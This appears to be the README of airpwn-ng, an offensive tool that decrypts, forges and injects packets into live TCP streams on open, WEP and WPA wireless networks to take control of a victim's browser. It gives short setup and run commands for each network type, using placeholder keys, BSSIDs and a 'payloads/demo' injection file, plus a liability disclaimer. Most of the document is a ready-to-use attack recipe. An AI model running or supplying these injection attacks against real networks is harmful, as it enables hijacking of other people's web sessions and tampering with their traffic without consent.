## Overview
* We force the target's browser to do what we want
* Demo video: https://www.youtube.com/watch?v=hiyaUZh-UiU

## Disclaimer
Illicit usage of this code has the potential to land the user in Legal and/or Civil jeopardy if used for malicious purposes or even unknowingly by perhaps using the wrong MAC filter as an example.  Ensure you know what the syntax you are running actually does.  Even better, have a glance at the source code to make sure for yourself.  Better than that, help us write a wiki on how this whole thing is put together for the betterment of society.  airpwn-ng is a tool meant for legal and ethical purposes.  The authors of airpwn-ng, airpwn and pretty much every other hacking tool out there take no, zip, zilch, zero and nada on the responsibility for what you the user does with it.

## How do we do it?
* We decrypt, interpret, create, encrypt and inject packets into and from a live TCP stream.
* For a more detailed and in-depth explanation as to how this occurs, read the original documentation for airpwn:
* http://airpwn.sourceforge.net/Documentation.html

### Open Wireless
Can be implemented with one NIC in monitor mode.
```
python3 -m pip install RESOURCEs/*.tar.gz
python3 ./airpwn-ng -i wlan0mon -m wlan0mon --injection payloads/demo --channel 6 -s 5 -w 30
```

### WEP
Requires one NIC in managed mode as a workaround until the WEP encryption is fixed.
```
python3 -m pip install RESOURCEs/*.tar.gz
python3 ./airpwn-ng -i wlan0 --inj man -m wlan1mon --injection payloads/demo --channel 6 --wep 0000000000 --bssid AA:BB:CC:DD:EE:FF
```

### WPA
Can be implemented with one NIC in monitor mode.
```
python2 -m pip install _python2/RESOURCEs/*.tar.gz
cd _python2
python2 ./airpwn-ng -i wlan1mon -m wlan1mon --bssid 'aa:bb:cc:dd:ee:ff' --essid 'ZerosAndOnes' --wpa 'SuperHardPassword' --injection payloads/demo
```
